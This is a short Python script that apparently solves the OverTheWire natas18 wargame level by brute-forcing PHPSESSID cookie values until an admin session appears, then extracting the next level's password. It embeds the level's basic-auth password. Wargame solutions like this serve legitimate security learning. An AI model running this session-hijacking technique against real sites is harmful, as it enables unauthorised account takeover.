import re
import requests
import string

url = 'http://natas18.natas.labs.overthewire.org/index.php?debug=1'
basic_auth = ("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
successful_force_crib = "You are an admin."

def attempt(session_id):
    response = (
        requests.get(
            url,
            auth=basic_auth,
            proxies={"http": "http://127.0.0.1:8080"},
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
            },
            cookies={
                "PHPSESSID": str(session_id),
            }
        ).text
    )

    if successful_force_crib in response:
        return re.findall(r"Password: (.*)</pre>", response)[0]
    return None

def run_brute_force_admin_id():
    for i in range(641):
        print(f"Trying {i}")
        result = attempt(i)
        if result is not None:
            return result

if __name__ == "__main__":
    print(run_brute_force_admin_id())
